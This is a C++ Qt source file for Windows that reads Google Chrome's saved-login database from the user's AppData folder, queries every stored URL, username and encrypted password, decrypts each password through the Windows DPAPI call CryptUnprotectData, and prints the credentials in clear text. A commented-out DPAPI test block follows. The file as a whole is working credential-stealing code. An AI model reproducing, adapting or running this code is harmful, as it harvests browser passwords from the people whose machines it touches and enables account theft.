//#pragma comment(lib,"crypt32.lib")
#include <iostream>
#include <QCoreApplication>
#include <QtSql/QSqlDatabase>
#include <QSqlQuery>
#include <QString>
#include <QVariant>
#include <QDebug>
#include <QSqlError>
#include <QTextCodec>

#include <windows.h>
//#include "dpapi.h"
//#include <wincrypt.h>

using namespace std;

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    setlocale(LC_CTYPE, "rus");

    //Connect DB
    QSqlDatabase db;
    db = QSqlDatabase::addDatabase("QSQLITE");
    QString appdata = getenv("APPDATA");
    appdata.replace("\\", "/");
    db.setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
    //qDebug() << db.databaseName() << endl;
    db.open();


    if ( !db.isOpen() )
    {
        qDebug() << "Error\n";
    }
    else
    {
        //Create SQL Query; select url+login+pass
        QSqlQuery query;
        query.exec("SELECT origin_url, username_value, password_value FROM logins");
        while (query.next())
        {

            QString url = query.value(0).toString();
            QString user = query.value(1).toString();
            QByteArray pass = query.value(2).toByteArray();

            //Decrypt
            DATA_BLOB DataIn;
            DATA_BLOB DataOut;
            DATA_BLOB * pDataIn = &DataIn;
            DATA_BLOB * pDataOut = &DataOut;
            BYTE *pbDataInput = reinterpret_cast<byte *>( pass.data() );
            DWORD cbDataInput = pass.size();//strlen((char *)pbDataInput)+1;
            DataIn.pbData = pbDataInput;
            DataIn.cbData = cbDataInput;

            //QByteArray qba = reinterpret_cast<char *>(DataIn.pbData);
            //QByteArray qba( reinterpret_cast<char *>(DataIn.pbData),  pass.size());//strlen((char *)pbDataInput)+1);


            //qDebug() << pass << endl << qba << endl; //<< qba;//reinterpret_cast<char *>(DataIn.pbData) << endl;

            if (CryptUnprotectData(
                    pDataIn,
                    NULL,
                    NULL,               // Optional entropy
                    NULL,
                    NULL,
                    0,
                    pDataOut))
            {
                //QByteArray qba( reinterpret_cast<char *>(DataOut.pbData));
                qDebug() << endl << url << endl << "user = " << user << "\npass =  " <<  reinterpret_cast<char *>(DataOut.pbData);

                //qDebug() << qba.data();//reinterpret_cast<char* >(DataOut.pbData);
            }
            else
            {
                qDebug() << "\nDecryption error!";
                //qDebug() << endl << reinterpret_cast<char* >(DataOut.pbData);
            }





        }
    }

    //qDebug() << db.tables() << " ";


/*

    DATA_BLOB DataIn;
    DATA_BLOB DataOut;
    BYTE *pbDataInput =(BYTE *)"Hello world of data protection.";
    DWORD cbDataInput = strlen((char *)pbDataInput)+17;

    DataIn.pbData = pbDataInput;
    DataIn.cbData = cbDataInput;
    QByteArray qba;
    char * ch = reinterpret_cast<char *> (pbDataInput);
    qba = ch;

    qDebug() << DataIn.pbData << endl<< reinterpret_cast<char *>(DataIn.pbData) << endl << qba.data();

    if(CryptProtectData(
         &DataIn,
         NULL, // A description string
                                             // to be included with the
                                             // encrypted data.
         NULL,                               // Optional entropy not used.
         NULL,                               // Reserved.
         NULL,                               // Pass NULL for the
                                             // prompt structure.
         0,
         &DataOut))
    {
         qDebug() << "The encryption phase worked.\n";
    }

    DATA_BLOB DataVerify;

    if ( CryptUnprotectData(
            &DataOut,
            NULL,
            NULL,                 // Optional entropy
            NULL,                 // Reserved
            NULL,                 // Here, the optional
                                  // prompt structure is not
                                  // used.
            0,
            &DataVerify) )
    {
       qDebug() << "The decrypted data is: " << reinterpret_cast<char *>(DataVerify.pbData) << endl;
       printf("The decrypted data is: %s\n", DataVerify.pbData);
    }
    else qDebug() << "Decryption error!";


*/

    return a.exec();
}
